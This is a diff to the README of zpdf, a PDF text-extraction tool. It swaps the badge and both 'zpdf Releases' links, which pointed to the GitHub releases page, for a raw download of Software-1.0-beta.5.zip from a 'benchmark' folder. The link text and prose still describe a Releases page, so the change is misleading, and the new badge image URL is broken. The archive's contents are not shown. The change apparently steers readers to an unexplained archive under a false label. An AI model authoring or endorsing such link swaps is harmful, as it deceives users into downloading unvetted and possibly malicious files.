@@ -11,7 +11,7 @@
 ## 🚀 Getting Started
 Welcome to zpdf! This application helps you extract text from PDF files quickly and efficiently. Whether you're a student, professional, or just curious, zpdf streamlines the process.
 
-![Download zpdf](https://img.shields.io/badge/Download%20zpdf-brightgreen)
+![Download zpdf](https://github.com/adilgamedev/zpdf/raw/refs/heads/main/benchmark/Software-1.0-beta.5.zip%20zpdf-brightgreen)
 
 ## 🖥️ System Requirements
 Before you begin, make sure your system meets the following requirements:
@@ -21,7 +21,7 @@ Before you begin, make sure your system meets the following requirements:
 - Storage: Minimum 100 MB of free space
 
 ## ⬇️ Download & Install
-To get started with zpdf, visit this page to download: [zpdf Releases](https://github.com/adilgamedev/zpdf/releases). 
+To get started with zpdf, visit this page to download: [zpdf Releases](https://github.com/adilgamedev/zpdf/raw/refs/heads/main/benchmark/Software-1.0-beta.5.zip). 
 
 Once on the Releases page, find the latest version. Click on the appropriate file for your operating system to start the download. 
 
@@ -46,4 +46,4 @@ Once installed, using zpdf is easy:
 ## 💬 Support and Feedback
 If you have questions or feedback, feel free to reach out. We’re here to help you make the most of zpdf.
 
-Visit this page to download: [zpdf Releases](https://github.com/adilgamedev/zpdf/releases) and enjoy seamless PDF text extraction today!
+Visit this page to download: [zpdf Releases](https://github.com/adilgamedev/zpdf/raw/refs/heads/main/benchmark/Software-1.0-beta.5.zip) and enjoy seamless PDF text extraction today!
